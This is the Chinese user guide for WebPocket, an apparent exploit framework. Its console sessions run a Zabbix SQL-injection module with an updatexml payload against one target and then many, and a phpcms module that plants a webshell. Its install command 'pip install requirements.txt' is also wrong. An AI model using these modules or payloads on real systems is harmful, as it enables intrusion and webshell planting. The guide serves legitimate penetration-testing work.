==================
快速入门
==================


下载 && 安装
==================

首先克隆最新的代码到本地 ::

    git clone https://github.com/TuuuNya/WebPocket

然后安装Python所需的模块 ::

    pip install requirements.txt

如果要使用虚拟环境可自行安装virtualenv等Python虚拟环境。

执行如下命令，如果看到WebPocket的Banner则为安装完成。 ::

    python WebPocket.py
    ➜ python3 WebPocket.py

    W)      ww         b)      P)ppppp                  k)               t)
    W)      ww         b)      P)    pp                 k)             t)tTTT
    W)  ww  ww e)EEEEE b)BBBB  P)ppppp   o)OOO   c)CCCC k)  KK e)EEEEE   t)
    W)  ww  ww e)EEEE  b)   BB P)       o)   OO c)      k)KK   e)EEEE    t)
    W)  ww  ww e)      b)   BB P)       o)   OO c)      k) KK  e)        t)
     W)ww www   e)EEEE b)BBBB  P)        o)OOO   c)CCCC k)  KK  e)EEEE   t)T




    (✿ ♥‿♥)   WebPocket has 2 modules

    WebPocket >

常用命令
==================

对单目标执行POC/EXP
-------------------

此处以 ``exploits/http/zabbix/zabbix_latest_php_sqli`` 模块为例，对目标 ``http://127.0.0.1:8080`` 执行。 ::

    WebPocket > use exploits/http/zabbix/zabbix_latest_php_sqli
    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > show options
    Module options:

    name     required    description                            value
    -------  ----------  -------------------------------------  ---------------------------------
    URL      True        The url to be tested
    TIMEOUT  True        Connection timeout                     5
    THREADS  True        The number of threads                  1
    SQL      True        The SQL statement you want to execute  updatexml(0,concat(0xa,user()),0)

    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > set URL http://127.0.0.1:8080
    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > check
    [+] Check success!
    [+] URL:http://127.0.0.1:8080 has the vulnerability
    [*] module execution completed
    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > exploit
    [+] Exploit success!
    [+] Exploit result: root@172.18.0.4
    [*] module execution completed
    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) >

首先 ``use`` 模块，然后使用 ``show options`` 查看需要设置的参数。

最后使用 ``check`` 或者 ``exploit`` 执行检查/测试。

对多个目标执行POC/EXP
-----------------------

首先执行 ``python WebPocket.py`` 进入交互式命令行。

当要对多个目标执行POC的时候，可以把目标写入到txt文件，然后使用 ``set URL -f target.txt`` 传入。例如： ::

    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > use exploits/http/zabbix/zabbix_latest_php_sqli
    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > show options
    Module options:

    name     required    description                            value
    -------  ----------  -------------------------------------  ---------------------------------
    URL      True        The url to be tested
    TIMEOUT  True        Connection timeout                     5
    THREADS  True        The number of threads                  1
    SQL      True        The SQL statement you want to execute  updatexml(0,concat(0xa,user()),0)

    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > set URL -f url.txt
    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > set THREADS 20
    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) > exploit
    [+] Exploit result: root@172.18.0.4
    [+] Exploit result: root@172.18.0.4
    [+] URL:http://www.hackersb.cn Maybe not zabbix? not found zbx_sessionid
    [+] URL:http://www.hackersb.cn Maybe not zabbix? not found zbx_sessionid
    [+] Exploit result: root@172.18.0.4
    [+] Exploit result: root@172.18.0.4
    [+] URL:http://www.hackersb.cn Maybe not zabbix? not found zbx_sessionid
    [+] URL:http://www.hackersb.cn Maybe not zabbix? not found zbx_sessionid
    [+] URL:http://www.hackersb.cn Maybe not zabbix? not found zbx_sessionid
    WebPocket exploits(http/zabbix/zabbix_latest_php_sqli) >

相信你也看到了，可以设置 ``THREADS`` 来设置线程数，支持多线程执行 :)

所有命令
==================

help
-----------

输入 ``help`` 可查看所有命令 ::

    WebPocket > help

    Documented commands (type help <topic>):

    Core Command
    ============
    banner  db_rebuild

    Module Command
    ==============
    back  check  exploit  list  reload  run  search  set  show  use

    Other
    =====
    help  history  quit

    WebPocket >

``help`` 后可跟WebPocket命令，用来查看WebPocket命令的作用 ::

    WebPocket > help  quit
    Usage: quit [-h]

    Exit this application

    optional arguments:
      -h, --help  show this help message and exit

    WebPocket >

list
-------------

``list`` 命令用来列出所有可用的模块 ::

    WebPocket > list
    Module List:

    module_name                                  check    disclosure_date    description
    -------------------------------------------  -------  -----------------  -----------------------------------
    exploits/cms/zabbix_2_0_3_sqli               False    2016-08-22         zabbix 2.0.3 jsrpc.php sqli
    exploits/cms/phpcms_9_6_0_register_getshell  True     2017-04-14         phpcms 9.6.0 register page getshell

    WebPocket >

注：WebPocket启动时会自动创建sqlite数据库，位于 ``database/`` 目录下， ``search`` 命令是从数据库中取出的数据。
如果添加或删除了模块，需要执行 ``db_rebuild`` 重新构建数据库以用于检索。

search
----------

``search`` 命令用来检索模块，可根据 ``name``, ``module_name``, ``description``, ``author``, ``disclosure_date``, ``service_name``, ``service_version``, ``check`` 字段来进行检索。

默认按 ``module_name`` 检索，比如： ::

    WebPocket > search phpcms
    Search results:

    module_name                                  check    disclosure_date    description
    -------------------------------------------  -------  -----------------  -----------------------------------
    exploits/cms/phpcms_9_6_0_register_getshell  True     2017-04-14         phpcms 9.6.0 register page getshell

    [+] The search is only retrieved from the database
    [+] If you add some new modules, please execute `db_rebuild` first

    WebPocket >

支持多个关键词，使用方法如下: ::

    WebPocket > search service_name=phpcms  service_version=9.6.0
    Search results:

    module_name                                  check    disclosure_date    description
    -------------------------------------------  -------  -----------------  -----------------------------------
    exploits/cms/phpcms_9_6_0_register_getshell  True     2017-04-14         phpcms 9.6.0 register page getshell

    [+] The search is only retrieved from the database
    [+] If you add some new modules, please execute `db_rebuild` first

    WebPocket >

use
----------

``use`` 命令用于选择要使用的模块： ::

    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) > use exploits/cms/phpcms_9_6_0_register_getshell
    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) >

show
----------

``show`` 命令可用于查看模块信息，支持 ``info``, ``options``, ``missing`` 子命令。

 * ``show info`` 命令用于查看模块信息以及模块参数
 * ``show options`` 命令用于查看模块参数
 * ``show missing`` 命令用于查看必填却没有填写的参数

使用样例如下： ::

    WebPocket > use exploits/cms/phpcms_9_6_0_register_getshell
    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) > show info
    Module info:

               name:  phpcms 9.6.0 register getshell
        description:  phpcms 9.6.0 register page getshell
             author:  ['unknown']
         references:  ['https://www.hackersb.cn/hacker/219.html']
    disclosure_date:  2017-04-14
       service_name:  phpcms
    service_version:  9.6.0

    Module options:

    name      required    description        value
    --------  ----------  -----------------  -------
    host      True        The target domain
    password  True        webshell password

    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) > show options
    Module options:

    name      required    description        value
    --------  ----------  -----------------  -------
    host      True        The target domain
    password  True        webshell password

    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) > show missing
    Missing Module options:

    name      required    description        value
    --------  ----------  -----------------  -------
    host      True        The target domain
    password  True        webshell password

    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) >

set
----------

``set`` 命令用于设置模块参数，格式为：``set name value``，使用案例如下: ::

    WebPocket > use exploits/cms/phpcms_9_6_0_register_getshell
    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) > show options
    Module options:

    name      required    description        value
    --------  ----------  -----------------  -------
    host      True        The target domain
    password  True        webshell password

    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) > set host http://www.hackersb.cn
    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) > set password 123
    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) >

check
----------

``check`` 方法用于检测目标是否存在该模块所对应的漏洞。可理解为验证漏洞（POC）。

使用案例如下： ::

    WebPocket > use exploits/cms/phpcms_9_6_0_register_getshell
    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) > show options
    Module options:

    name      required    description        value
    --------  ----------  -----------------  -------
    host      True        The target domain
    password  True        webshell password

    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) > set host http://www.hackersb.cn
    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) > set password 123
    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) > check
    [+] Check success!
    [+] Target http://www.hackersb.cn has vul
    [*] module execution completed
    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) >

exploit / run
---------------

``exploit`` 命令等同于 ``run`` ，用于执行模块/Exploit

使用案例如下： ::

    WebPocket > use exploits/cms/phpcms_9_6_0_register_getshell
    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) > show options
    Module options:

    name      required    description        value
    --------  ----------  -----------------  -------
    host      True        The target domain
    password  True        webshell password

    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) > set host http://www.hackersb.cn
    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) > set password 123
    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) > exploit
    [+] Exploit success!
    [+] Webshell: http://www.hackersb.cn/shell.php
    [*] module execution completed
    WebPocket exploits(cms/phpcms_9_6_0_register_getshell) >

back
----------

``back`` 命令用于取消选中的模块，和 ``use`` 命令相反。

reload
----------

``reload`` 命令用于重新加载模块，比如在执行WebPocket以后，修改了模块代码，需要重新加载最新的代码，可以使用该命令。

